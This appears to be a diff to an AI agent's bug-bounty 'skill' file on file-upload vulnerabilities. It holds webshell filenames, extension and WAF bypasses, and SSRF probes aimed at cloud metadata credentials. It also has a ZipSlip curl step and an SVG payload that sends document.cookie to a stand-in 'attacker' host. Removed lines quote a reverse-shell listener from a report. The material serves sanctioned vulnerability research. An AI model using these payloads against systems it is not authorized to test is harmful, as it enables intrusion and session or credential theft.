@@ -4,13 +4,13 @@ description: "Use for upload endpoints and file processing: webshells, SVG/HTML 
 agent_created: true
 ---
 
-# File Upload and File-Handling Flaws — unified skill
+# File Upload and File-Handling Flaws — unified methodology
 
-> **Complete merged skill.** Everything from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.
+> **Methodology skill.** Merged from 3 upstream skills across cbh, h1skills, hunting and grounded in 15,259 disclosed HackerOne reports. Payloads, wordlists and supporting data are in `references/`.
 
-## Corpus evidence — 55 valid HackerOne reports (12 paid / 22%)
+## Corpus signal — 55 valid reports (12 paid / 22%)
 
-Every disclosed report is valid; payment is an impact signal, not a validity test.
+Every disclosed report is valid; payment is an impact signal, not a validity test. Full technique frequencies, case studies and approach patterns: `references/evidence.md`.
 
 ### Techniques ranked across ALL valid reports
 
@@ -28,101 +28,6 @@ Every disclosed report is valid; payment is an impact signal, not a validity tes
 | public source-code / repo review | 4 |
 | header injection (Host / X-Forwarded / etc.) | 4 |
 | two-account / cross-account replay | 4 |
-| subdomain / DNS / cert-transparency recon | 4 |
-| cache / CDN / unkeyed header | 3 |
-| XML / SOAP / SAML / XXE | 3 |
-| DOM / HTML source inspection | 3 |
-| admin / privileged-role context | 2 |
-| unauthenticated / removed-cookie test | 2 |
-| employee / developer public info | 2 |
-| JS bundle / source-map inspection | 2 |
-| race / concurrency / timing | 2 |
-| OAST / DNS / HTTP callback proof | 2 |
-| response diff / status / length comparison | 1 |
-| redirect chain / Location header | 1 |
-| replay / modify a captured request | 1 |
-| API docs / Swagger / introspection | 1 |
-| swap object ID / parameter value | 1 |
-| public bucket / storage exposure | 1 |
-| error message / stack trace probing | 1 |
-| intercept & replay request in Burp | 1 |
-
-### Parameters observed in writeups
-
-`src` (5), `width` (4), `height` (4), `onerror` (3), `href` (3), `page` (2), `type` (2), `fwa` (2), `style` (2), `stroke-width` (2), `has_used_cb` (2), `details` (1), `case` (1), `mimetype` (1), `max-age` (1), `boundary` (1), `name` (1), `filename` (1), `xss` (1), `xssi` (1), `version` (1), `encoding` (1), `standalone` (1), `svg` (1), `xmlns` (1), `xlink` (1), `like` (1), `payload` (1)
-
-### Bypass primitives observed
-
-`content-type` (11), `bypass` (6), `bypassed` (4), `open redirect` (2), `whitelist` (2), `bypassing` (1)
-
-### Impact language observed
-
-`rce` (13), `admin` (8), `token` (5), `remote code execution` (4), `arbitrary file` (3), `localhost` (3), `secret` (2), `credential` (2), `exfiltrate` (1), `sensitive data` (1), `unauthorised` (1), `password` (1), `unauthorized` (1)
-
-### Case studies — full excerpts (paid and unpaid)
-
-#### [1547877](https://hackerone.com/reports/1547877) — [Kafka Connect] [JdbcSinkConnector][HttpSinkConnector] RCE by leveraging file upload via SQLite JDBC driver and SSRF to internal Jolokia
-
-Aiven Ltd · $5000 · critical
-
-## Summary: The Aiven JDBC sink includes the SQLite JDBC Driver. This JDBC driver can be used to upload SQLite database files onto the server. The HTTP sink connector allows sending HTTP requests to localhost. There is unprotected Jolokia listening on `localhost:6725`. JMX exports the `com.sun.management:type=DiagnosticCommand` MBean, which contains the `jvmtiAgentLoad` operation. This operation can be used to execute the SQLite database as JVM Agent by embedding the JVM Agent JAR file inside the SQLite database as an BLOB field in a table. ## Steps To Reproduce: {F1703051} 1. Login into my VPS: `ssh ████`, password: `█████████@` 1. Execute `nc -nlvp 4446` 1. cd to `jdbc-sqlite-jolokia-rce` and run `python3 poc.py` (if running locally, install kafka-python using pip first). 1. Reverse shell connection should now be established to my test instance ## Impact RCE on the Kafka Connect server
-
-#### [401483](https://hackerone.com/reports/401483) — [chaturbate.com] - CSRF Vulnerability on image upload
-
-Chaturbate · $300 · medium
-
-##Summary## Hi guys, One of the features available to a Chaturbate user is the ability to upload images into photo sets. The upload functionality does not use any CSRF tokens, allowing attackers to perform CSRF attacks and upload images to a user's profile without the user's consent. ## Steps To Reproduce: 1. Login to Chaturbate. 2. Browse to your profile page and upload an image. 3. Note the `set` ID of the newly created set (this is available by visiting set in the profile page. It'll be in the URL : ` 4. Download the poc.html file attached to this report. 5. Edit `poc.html` by replacing the number `4771110` by the `set` ID found at step #3. 6. Open poc.html and click on `Submit request`. 7. Visit your Chaturbate image set. You'll notice that the photo set now inludes an additional image (a blank/white image). ## Impact In order for this attack to work, an attacker would need to know the correct photo set ID. Since set IDs are public information, this isn't an issue. I've set the impact here to medium since this affects the integrity of user accounts.
-
-#### [3008878](https://hackerone.com/reports/3008878) — Stored XSS via SVG Upload in chat.line.biz
-
-LY Corporation · $100 · low
-
-The web application allowed users to upload SVG files via chat.line.biz without properly filtering or disabling scripts embedded inside the SVG content. As a result, an attacker could upload a malicious SVG containing JavaScript, and when another user later opened this file in the management interface, the embedded script would be executed in the browser, leading to a stored cross-site scripting (Stored XSS) vulnerability.
-
-#### [1606957](https://hackerone.com/reports/1606957) — Unrestricted File Upload on reddit.secure.force.com
-
-Reddit · $100 · low
-
-## Summary: Reddit.secure.force.com is Reddit SalesForce instance. Attacker is able to send attachments of disallowed filetypes to this server. The attacker is able to send malicious documents such as CVE-2022-30190 Follina to the victim. ## Impact: Attacker can send malicious files to whoever handles the form behind ## Steps To Reproduce: 1. Go to 2. Notice that the specified allowed filetype is: jpg jpeg gif png pdf as you can see with the image below: {F1780944} 3. If you try dragging and dropping a docx file to that box, there is a Javascript which forbids such action. But if you used the "Click to browse" option you can start uploading the file. {F1780957} 4. The file upload request: Here the data parameter contains the base64 encoded version of my clickme.docx file, which is based on the critical Follina vulnerability {F1780963}. This vulnerability can become a [zero click exploit]( 5. Response returns 200, indicated that there is no existing server side check for filetype and the file was uploaded successfully: ## Impact Attacker can send malicious files to whoever handles the form behind
-
-#### [351555](https://hackerone.com/reports/351555) — Disclosure of all uploads to Cloudinary via hardcoded api secret in Android app
-
-Reverb.com · no bounty — still valid · medium
-
-Hi, in file you have hardcoded the following config: where is basic auth details. It shouldn't be disclosed to third parties as official docs say ( > Note: You should only include the in the value, the api secret and key should be left out of the application. I was able to access your account data {F297519} {F297520} Those keys give me ability to not only access the files, but also replace and delete them, change different their settings. Also this url discloses statistics regarding stored files ## Impact Disclosure of all uploads to Cloudinary via hardcoded api secret in Android app
-
-#### [351555](https://hackerone.com/reports/351555) — Disclosure of all uploads to Cloudinary via hardcoded api secret in Android app
-
-Reverb.com · no bounty — still valid · medium
-
-Hi, in file you have hardcoded the following config: where is basic auth details. It shouldn't be disclosed to third parties as official docs say ( > Note: You should only include the in the value, the api secret and key should be left out of the application. I was able to access your account data {F297519} {F297520} Those keys give me ability to not only access the files, but also replace and delete them, change different their settings. Also this url discloses statistics regarding stored files ## Impact Disclosure of all uploads to Cloudinary via hardcoded api secret in Android app
-
-#### [419896](https://hackerone.com/reports/419896) — Unauthenticated user can upload an attachment to the last updated report draft
-
-HackerOne · no bounty — still valid · high
-
-"What, HackerOne resolved a report that was submitted by @jobert?" At HackerOne we often find security vulnerabilities ourselves. In most cases, we find them before new features even make it into production. Sometimes we find them when they're already in the wild. Recently we've launched a new feature called [retesting]( Up until now, HackerOne would always retest our own findings. We're changing that. This is the first report we identified ourselves where we're expanding retesting to the community. When we identified this vulnerability, we filed a ticket to our own bug bounty program instead of filing an internal ticket. We then leveraged the community to retest the vulnerability and allow them to find a bypass. This particular security vulnerability allowed an unauthenticated user to upload attachments and attach them to the last created report draft of other users. This was possible by sending a specially crafted request to the `/attachments` endpoint. Our investigation concluded that this was not abused. Thanks to the hackers that retested this vulnerability!
-
-### Recurring approach patterns from real reports
-
-- 2× description i was able to identify unsafe upload endpoint on the poc go to the upload some test file
-- 1× hi when a new driver is registering on uber they have to upload a variety of files proof of insurance id etc
-- 1× i was able to access your account data f297519 f297520 those keys give me ability to not only access the files but also replace and delete them change different their settings
-- 1× this is the first report we identified ourselves where we re expanding retesting to the community
-- 1× when we identified this vulnerability we filed a ticket to our own bug bounty program instead of filing an internal ticket
-- 1× this was possible by sending a specially crafted request to the attachments endpoint
-- 1× i found an unrestricted file upload on which let me upload anything
-- 1× i tested by uploading an executable visual studio community installer and a php file
-- 1× i have not tried this but found the below resource about it steps to reproduce
-- 1× i observed that when uploading a user avatar picture the first request was sent to with a post parameter contenttype telling the type of file being uploaded
-- 1× i changed the value to image svg xml
-- 1× now i sent a put request to the presignedurl that we got from the first request with http header content type image svg xml
-- 1× for fetching local files from the server itself lfi i created another user named testing68 and uploaded an avatar picture for it
-- 1× summary hello i found a critical vunerability in one of your site where user can upload any file type as a profile picture including php file steps to reproduce
-- 1× summary hello again lichess team i found an input validation issue in the image upload endpoint that lets me inject special characters into the rel parameter
-- 1× while testing upload functionality i noticed that colon characters aren t properly sanitized which could cause parsing issues in other parts of the application description the upload image user rel endpoint doesn t validate the rel parameter properly
-- 1× i noticed there s regex parsing logic in findinmarkdown that might not handle malformed imageids correctly this could cause issues in logging image lookup or markdown parsing where the format of imageid is implicitly assumed
-- 1× the bug is in cr in resume from lib sendf c when it falls back to reading and discarding through ctx read cb no seek callback available it does not set ctx has used cb
 
 ## Corpus-backed method (this class)
 
@@ -151,18 +56,13 @@ HackerOne · no bounty — still valid · high
 - SVG upload -> stored XSS in admin view.
 - DOCX upload -> XXE -> SSRF.
 
-### Probes
-
-- Double extension, polyglot content, SVG script, ZIP/tar symlink entry, Content-Disposition filename control.
-
 ### Veteran tip
 
 Filename-to-shell-out is a recurring corpus pattern; read the processing code before payload fuzzing.
 
-## Unified upstream methodology (complete, deduplicated)
+## Unified upstream methodology (deduplicated)
 
 ### Discovery and hunting method
-
 ### Quick wins
 
 Start here. These are the highest-yield tests for this class.
@@ -191,10 +91,7 @@ Start here. These are the highest-yield tests for this class.
 - Server config override files: `.htaccess` (Apache), `web.config` (IIS), `.user.ini` — check whether they can be uploaded and whether the upload dir is configured to process them.
 - Alternative executable extensions by stack: PHP `.php .phtml .php5 .php7 .pht .phar`; ASP/ASPX `.asp .aspx .asa .cer .soap`; JSP `.jsp .jspx .jsw .jsv .jspf`; plus `.shtml`, `.cgi`, `.pl`, `.cfm`.
 - Non-RCE impact formats: `.svg` (XSS/XXE/SSRF), `.html` (stored XSS, `.hta` for client-side RCE), `.csv` (CSV injection), `.xml`/`.docx`/`.xlsx` (XXE), `.zip` (Zip Slip), `.avi` (LFI/SSRF).
-- File-URL signer endpoints: inspect base64 policy fields for missing key-prefix, content-length, content-type, or expiry conditions — anonymous `?max-keys=1` can find buckets with ListBucket enabled separately from GetObject.
-
-### Signals and surfaces
-
+- File-URL signer endpoints: inspect base64 policy fields for missing key-prefix, content-length, content-type, or expiry conditions — anonymous `?max-keys=1` can find buckets with ListBucket enabled separately from GetObject.### Signals and surfaces
 ### Signal
 
 - Reports: **100** · paid: **20**
@@ -218,10 +115,7 @@ Start here. These are the highest-yield tests for this class.
 
 Parameters, endpoints, and fields that commonly carry this bug:
 
-`avatar` `upload` `file` `attachment` `document` `image` `import` `archive`
-
-### Techniques, payloads and bypasses
-
+`avatar` `upload` `file` `attachment` `document` `image` `import` `archive`### Techniques and bypasses
 ### Payloads & probes
 
 - `shell.php.jpg` `shell.pHp` `shell.php%00.jpg` `shell.svg`
@@ -363,10 +257,7 @@ filename=shell.phtml, shell.pHp, shell.php5   → extension variants
 - Path traversal in the upload destination: set `uploadPath=../temp`, `uploadPath=..%2f..%2ftrav`, or `uploadPath=/tmp/dir` and check the returned URL for reflected traversal.
 - Race conditions: upload-then-delete validation windows (AV scanners), or brute-force `uniqid()`-generated temp directories — enlarge the window with a large padded file whose payload is at the start.
 - `PUT` upload: send `OPTIONS` to discover endpoints advertising PUT, then `PUT /images/exploit.php` with `Content-Type: application/x-httpd-php`.
-- Parser exploitation without RCE: SVG `<script>` stored XSS, DOCX/XLSX XXE, ImageMagick MVG `fill 'url(http://169.254.169.254/...)'` and SVG `<image xlink:href=...>` SSRF, ffmpeg m3u8/concat SSRF, headless-Chrome PDF `@import`/iframe/file:// reads.
-
-### Validation and proof
-
+- Parser exploitation without RCE: SVG `<script>` stored XSS, DOCX/XLSX XXE, ImageMagick MVG `fill 'url(http://169.254.169.254/...)'` and SVG `<image xlink:href=...>` SSRF, ffmpeg m3u8/concat SSRF, headless-Chrome PDF `@import`/iframe/file:// reads.### Validation and proof
 ### Reporting bar
 
 - Prove real impact on a second controlled account or a safe callback.
@@ -418,10 +309,7 @@ filename=shell.phtml, shell.pHp, shell.php5   → extension variants
 - The upload directory is served from a cookieless/CDN domain — XSS there cannot steal the app's cookies.
 - The generated filename is a UUID with a forced extension — pivot to path traversal in a directory field or a secondary parser.
 - The declared `Content-Type` is overwritten to `application/octet-stream` — client-side execution may be impossible.
-- A WAF blocks `<?php` — use a short echo tag `<?= ... ?>`, a polyglot, or an image-metadata payload.
-
-### Escalation and related chains
-
+- A WAF blocks `<?php` — use a short echo tag `<?= ... ?>`, a polyglot, or an image-metadata payload.### Escalation and related chains
 ### Escalation chains
 
 - Upload -> XSS.
@@ -451,10 +339,7 @@ filename=shell.phtml, shell.pHp, shell.php5   → extension variants
 - **`hunt-xss`** — SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` → victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) → cookie theft → ATO via session hijack.
 - **`hunt-ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
 - **`security-arsenal`** — Reach for the file-upload bypass tree: 10-row extension/MIME/magic-byte bypass table (double-ext, null-byte, case variants, `.phtml`/`.phar`/`.php5`/`.pht`, `.htaccess` upload to re-enable handlers, `web.config` upload on IIS), SVG/MVG/SVGZ payloads, DOCX-XXE templates, ZIP-slip path traversal in archives, polyglot generators.
-- **`triage-validation`** — Apply the Reproducibility Gate. A file successfully uploaded but never served, never executed, never parsed by anything is not a finding — it's a write-only blob. Critical RCE requires the actual `whoami` round-trip from the uploaded shell; stored XSS requires the popup firing in a victim browser, not just the file existing on disk.
-
-### Tools and wordlists
-
+- **`triage-validation`** — Apply the Reproducibility Gate. A file successfully uploaded but never served, never executed, never parsed by anything is not a finding — it's a write-only blob. Critical RCE requires the actual `whoami` round-trip from the uploaded shell; stored XSS requires the popup firing in a victim browser, not just the file existing on disk.### Tools
 ### Tools
 
 `Burp` · `ffuf` · `exiftool` · `nuclei`
@@ -490,10 +375,7 @@ nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
 # authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
 ```
 
-Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
-
-### Sources and related reading
-
+Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.### Sources and related reading
 ### Query the corpus
 
 ```sh
@@ -524,10 +406,7 @@ python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class file
 ### D. Sources — numbered list of URLs you actually fetched
 
 1. https://portswigger.net/web-security/file-upload
-2. https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
-
-### Additional notes
-
+2. https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html### Additional notes
 ### Parameters observed
 
 `mode` · `getsc` · `page` · `imgnum` · `fwa` · `AWSAccessKeyId` · `Expires` · `Signature` · `url` · `action` · `path` · `_hxcategory` · `cmd` · `fileToUpload` · `subject` · `report_id` · `file` · `can` · `start` · `num`
@@ -670,161 +549,8 @@ curl -s -X POST "https://$TARGET/api/import" \
   -F "file=@/tmp/zipslip.zip"
 ```
 
----
-
-## Companion methodology (complete, deduplicated)
-
-Full text of every non-SKILL.md methodology document from the contributing skills.
-
-### Companion: hunting / references/payloads.md
-
-# File Upload — Combined Field Guide — Payload reference
-
-Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.
-
----
-
-## Payloads & probes
-
-
-
-- `shell.php.jpg` `shell.pHp` `shell.php%00.jpg` `shell.svg`
-
-- `.htaccess` -> `AddType application/x-httpd-php .jpg`
-
-- SVG -> `<svg onload=alert(1)>`
-
-- Zip -> `../../../../var/www/shell.php`
-
-
-
-## Payload fragments observed
-
-
-
-Recurring payloads from this class's writeups. Adapt, don't paste blindly.
-
-
-
-| Seen | Fragment |
-
-|---:|---|
-
-| 3× | `cr_in_resume_from()` |
-
-| 3× | `ctx->read_cb` |
-
-| 3× | `cr_in_needs_rewind()` |
-
-| 3× | `http_resume()` |
-
-| 2× | `ctx->has_used_cb` |
-
-| 2× | `ctx->has_used_cb = TRUE` |
-
-| 2× | `curl_multi_remove_handle() returned 8 / API function called from within callback / No ASAN crash` |
-
-| 1× | `https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}` |
-
-| 1× | `PWNED\n\nVictim Username: ${userData.user.username}\nVictim Email: ${userData.user.email}` |
-
-| 1× | `val image = PicfitImage( / id = ImageId(s"$rel:${ThreadLocalRandom.nextString(8)}.$extension"), / // rel parameter used directly without val` |
-
-| 1× | `curl -X POST "https://lichess.org/upload/image/user/test:evil:format:break" \ / -b "lila2=YOUR_SESSION_COOKIE" \ / -H "Origin: https://liche` |
-
-| 1× | `/upload/image/user/{rel}` |
-
-| 1× | `{rel}:{random12}:{random8}.{extension}` |
-
-| 1× | `$ne` |
-
-| 1× | `exiftool -Comment="\"><script>alert(prompt('XSS BY ZEROX4'))</script>" xss_comment_exif_metadata_double_quote.png` |
-
-| 1× | `█████████@` |
-
-| 1× | `<iframe srcdoc="&#x3c;script src='/file-upload/<UPLOAD ID>/payload.js?download'></script>">` |
-
-| 1× | `.html()` |
-
-| 1× | `SV_AddResource (t_eventscript, filename, FS_FileSize (filename), RES_FATALIFMISSING, 0);` |
-
-| 1× | `alert(XSS)` |
-
-
-
-## Parameters observed
-
-
-
-`mode` · `getsc` · `page` · `imgnum` · `fwa` · `AWSAccessKeyId` · `Expires` · `Signature` · `url` · `action` · `path` · `_hxcategory` · `cmd` · `fileToUpload` · `subject` · `report_id` · `file` · `can` · `start` · `num`
-
-
-
-## Wordlists
-
-
-
-Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.
-
-
-
-| File | Entries |
-
-|---|---:|
-
-| `~/.local/share/hackerone-reports/wordlists/paths_file-upload.txt` | 65 |
-
-| `~/.local/share/hackerone-reports/wordlists/params_file-upload.txt` | 25 |
-
-| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
-
-| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |
-
-
-
-```sh
-
-W=~/.local/share/hackerone-reports/wordlists
-
-ffuf -u https://target/FUZZ -w $W/paths_file-upload.txt \
-
-     -mc all -fc 404 -fs 0 -rate 40
-
-ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_file-upload.txt \
-
-     -mr 'canary|error|invalid|not found' -rate 40
-
-```
-
-
-
-## Nuclei
-
-
-
-Test extension/MIME/polyglot bypasses manually; scan for known upload CVEs on the detected stack.
-
-
-
-```sh
-
-nuclei -u https://target -tags file-upload \
-
-       -severity low,medium,high,critical -rl 40 -o nuclei_file-upload.txt
-
-nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
-
-       -rl 40 -o nuclei_file-upload_generic.txt
-
-# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
-
-```
-
-
-
-Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
-
-### Companion: hunting / references/techniques.md
+---### Companion methodology (deduplicated)
+### hunting / references/techniques.md
 
 # File Upload — Combined Field Guide — Technique reference
 
@@ -1082,120 +808,13 @@ python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class file-u
 
 python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class file-upload --min-bounty 1000
 
-```
+```## Probes
 
-## Corpus wordlists (mined)
+- Double extension, polyglot content, SVG script, ZIP/tar symlink entry, Content-Disposition filename control.
 
-### `params_file-upload.txt`
+## Supporting data
 
-```text
-mode
-getsc
-page
-imgnum
-fwa
-AWSAccessKeyId
-Expires
-Signature
-url
-action
-path
-_hxcategory
-cmd
-fileToUpload
-subject
-report_id
-file
-can
-start
-num
-groupby
-sort
-id
-input
-target
-```
-
-### `paths_file-upload.txt`
-
-```text
-/scripts/wa.cgi
-/savefiles/poc.asp
-/delete.me
-/upload.php
-/ui/core/index.html
-/admin.php
-/api/w/
-/api/user
-/w/
-/files
-/assistant/new
-/v1_1/reverb/usage
-/semsemhacker123/semsemtest/-/wikis/ssaa-home
-/attachments
-/hackers/retesting.html
-/display
-/upload/image/user/
-/data/definitions/20.html
-/upload/image/user/test:evil:format:break
-/api/upload
-/accounts/141376700
-/accounts/
-/restaurant/en-CA/signup
-/recruitjob/hxpublic_v6/hxinterface6.aspx
-/adhelp
-/adhelp/
-/adhelp/apexremote
-/repo/orbital/repo.asp
-/inventory/app_icon/upload/
-/app_icons/126cb3308e1a464385a49c4c7aaeac56
-/inventory/app/97142808ce5d4ace895480a3ffe7d631/
-/data/definitions/434.html
-/photo_videos/photoset/detail/[username
-/request
-/file-upload/
-/v3/members/oldsoul/photo
-/x-ctf-finals-2016-john-slick-web-25/
-/v3/members/oldsoul/photoUploadUrl
-/wp-admin/users.php
-/admin/file/upload
-/package/express-cart
-/en/user/images/users/-13-04-2021-20-15-16-payload.php
-/nexus/service/local/artifact/maven/content
-/nexus/content/repositories/5000
-/nexus/service/local/repositories
-/Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/FileUploader.ashx
-/vuln/detail/CVE-2025-64095
-/template-order/
-/CONTENT/content-pre1/171172-1.php5
-/core/controller/avatarcontroller.php
-/image1.php
-/en/early-warning/vulnerabilities/cve-2006-7109
-/tracker/CVE-2006-7109
-/cp/members/profile/settings
-/data/attacker/files/shell.php
-/login.cgi
-/production/000/006/741/bf60ba068e72e767b93d3fa35c89a36639dd1f19/msf-payload-x86.jpg.exe
-/hc/en-us/requests/new
-/registration-service/files/
-/████/registration-service/files/███████.html
-/app/registration/basic-info
-/████████/app/registration/basic-info
-/security/products/flash-player/apsb15-05.html
-/path/to/curl/lib/.libs/libcurl.a
-/wp-content/uploads/job-manager-uploads/company_logo/2015/11/Applet3863.class
-```
-
-## Source skills merged into this topic
-
-- `h1skills` — `hackerone-file-upload`
-- `hunting` — `file-upload`
-- `cbh` — `hunt-file-upload`
-
-## Provenance
-
-- `references/unified-method.md` — same deduplicated union as this file, for tooling
-- `references/upstream-*.md` — unmodified original SKILL.md from each repo
-- `references/upstream-assets/` — 2 companion files
-- `../../upstream/` — complete unmodified archives of all five source repositories
+- `references/evidence.md` — corpus technique frequencies, case studies, approach patterns
+- `references/payloads.md` — curated payload bank + upstream payload references
+- `references/wordlists/` — 2 mined paths/params/payload lists
 - `bbhunt-methodology` — orchestrator, state machine and class router
